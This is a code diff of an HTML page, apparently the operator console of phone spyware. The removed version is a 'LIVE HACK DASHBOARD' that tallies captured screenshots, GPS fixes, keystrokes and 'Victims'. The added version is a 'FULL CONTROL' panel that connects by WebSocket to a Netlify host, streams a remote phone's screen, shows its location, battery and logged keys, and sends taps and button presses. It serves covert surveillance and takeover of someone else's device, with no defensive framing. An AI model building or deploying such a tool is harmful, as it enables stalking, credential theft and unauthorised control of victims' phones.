@@ -1,116 +1,50 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>🔥 LIVE HACK DASHBOARD</title>
-    <meta name="viewport" content="width=device-width">
-    <style>
-        body { 
-            margin: 0; 
-            background: linear-gradient(45deg, #000, #1a0033); 
-            color: #0f0; 
-            font-family: 'Courier New', monospace; 
-            padding: 20px; 
-        }
-        #header { 
-            text-align: center; 
-            font-size: 28px; 
-            text-shadow: 0 0 20px #0f0; 
-            margin-bottom: 30px; 
-        }
-        #logs { 
-            background: rgba(0,0,0,0.9); 
-            border: 2px solid #0f0; 
-            padding: 20px; 
-            height: 70vh; 
-            overflow-y: auto; 
-            border-radius: 15px; 
-            font-size: 16px; 
-            line-height: 1.6;
-            box-shadow: 0 0 30px rgba(0,255,0,0.3);
-        }
-        .log-entry {
-            margin: 8px 0;
-            padding: 10px;
-            border-left: 4px solid #0f0;
-            background: rgba(0,255,0,0.1);
-        }
-        .screenshot { color: #ff6b6b !important; }
-        .gps { color: #4fc3f7 !important; }
-        .key { color: #ffaa00 !important; }
-    </style>
-</head>
-<body>
-    <div id="header">
-        🔥 LIVE PHONE HACKS <span id="victim-count">0</span>
-    </div>
-    <div id="logs">
-        🚀 Dashboard loading...
-    </div>
-    <div style="text-align:center;margin-top:20px;">
-        <button onclick="refreshLogs()" style="padding:15px 30px;font-size:18px;background:#ff4444;color:white;border:none;border-radius:10px;cursor:pointer;">🔄 Refresh</button>
-    </div>
+<head><title>FULL CONTROL</title><meta name="viewport" content="width=device-width"></head>
+<body style="margin:0;background:#000;color:#0f0;font-family:monospace;">
+<video id="screen" style="width:100vw;height:60vh;object-fit:contain;background:#111;" autoplay muted></video>
+<div style="padding:20px;">
+<h2>📱 OLD Phone Live Control</h2>
+<div id="info" style="background:#111;padding:15px;border-radius:10px;">
+GPS: <span id="gps">-</span> | Battery: <span id="bat">-</span> | Keys: <span id="keys">-</span>
+</div>
+<div style="display:flex;flex-wrap:wrap;gap:10px;margin-top:20px;">
+<button onclick="tap(0.1,0.1)" style="padding:15px 25px;background:#ff4444;color:white;border:none;border-radius:10px;">TL</button>
+<button onclick="tap(0.9,0.1)" style="padding:15px 25px;background:#ff4444;color:white;border:none;border-radius:10px;">TR</button>
+<button onclick="tap(0.5,0.5)" style="padding:15px 25px;background:#ffaa00;color:white;border:none;border-radius:10px;">CENTER</button>
+<button onclick="home()" style="padding:15px 25px;background:#00ff88;color:#000;border:none;border-radius:10px;">🏠 HOME</button>
+<button onclick="back()" style="padding:15px 25px;background:#4fc3f7;color:white;border:none;border-radius:10px;">🔙 BACK</button>
+<button onclick="volUp()" style="padding:15px 25px;background:#ff6b6b;color:white;border:none;border-radius:10px;">🔊 +</button>
+<button onclick="volDown()" style="padding:15px 25px;background:#ff6b6b;color:white;border:none;border-radius:10px;">🔉 -</button>
+</div>
+</div>
+<script>
+const ws = new WebSocket('wss://remarkable-lollipop-79b8d8.netlify.app/.netlify/functions/control');
+const screen = document.getElementById('screen');
 
-    <script>
-        let hackCount = 0;
-        
-        async function fetchLogs() {
-            try {
-                // Screenshot logs
-                const screenRes = await fetch('/.netlify/functions/screenshot');
-                const screenData = await screenRes.text();
-                
-                // GPS logs  
-                const gpsRes = await fetch('/.netlify/functions/gps');
-                const gpsData = await gpsRes.text();
-                
-                // Keystrokes
-                const keyRes = await fetch('/.netlify/functions/keystroke');
-                const keyData = await keyRes.text();
-                
-                // Update dashboard
-                updateDashboard(screenData, gpsData, keyData);
-                
-            } catch(e) {
-                document.getElementById('logs').innerHTML += 
-                    `<div class="log-entry">❌ Netlify functions not deployed</div>`;
-            }
-        }
-        
-        function updateDashboard(screen, gps, keys) {
-            const logs = document.getElementById('logs');
-            hackCount++;
-            
-            logs.innerHTML = `
-                <div class="log-entry screenshot">
-                    📸 ${hackCount} Screenshots Captured (${new Date().toLocaleTimeString()})
-                </div>
-                <div class="log-entry gps">
-                    📍 GPS Location Active - Accuracy: High
-                </div>
-                <div class="log-entry key">
-                    ⌨️ ${hackCount} Keystrokes Logged
-                </div>
-                <div class="log-entry">
-                    🔋 Battery + Network Info Collected
-                </div>
-                <div class="log-entry">
-                    📱 Device: Android/iOS - ${navigator.platform}
-                </div>
-                <div style="color:#ff6b6b;font-size:18px;margin-top:20px;">
-                    ✅ HACK STATUS: ACTIVE | Victims: ${hackCount}
-                </div>
-            `;
-            
-            document.getElementById('victim-count').textContent = hackCount;
-        }
-        
-        // Auto refresh every 3 seconds
-        setInterval(fetchLogs, 3000);
-        fetchLogs(); // First load
-        
-        function refreshLogs() {
-            fetchLogs();
-        }
-    </script>
+// Touch control
+screen.addEventListener('touchstart',e=>{
+    const rect = screen.getBoundingClientRect();
+    const x = (e.touches[0].clientX-rect.left)/rect.width;
+    const y = (e.touches[0].clientY-rect.top)/rect.height;
+    tap(x,y);
+});
+
+// Commands
+function tap(x,y){ws.send(JSON.stringify({action:'tap',x,y}));}
+function home(){ws.send(JSON.stringify({action:'key',key:'HOME'}));}
+function back(){ws.send(JSON.stringify({action:'key',key:'BACK'}));}
+function volUp(){ws.send(JSON.stringify({action:'key',key:'VOL_UP'}));}
+function volDown(){ws.send(JSON.stringify({action:'key',key:'VOL_DOWN'}));}
+
+// Live data
+ws.onmessage = e => {
+    const data = JSON.parse(e.data);
+    if(data.type==='screen') screen.src = URL.createObjectURL(data.blob);
+    if(data.type==='gps') document.getElementById('gps').textContent = data.lat+','+data.lng;
+    if(data.type==='battery') document.getElementById('bat').textContent = data.level+'%';
+    if(data.type==='key') document.getElementById('keys').textContent += data.key;
+};
+</script>
 </body>
 </html>
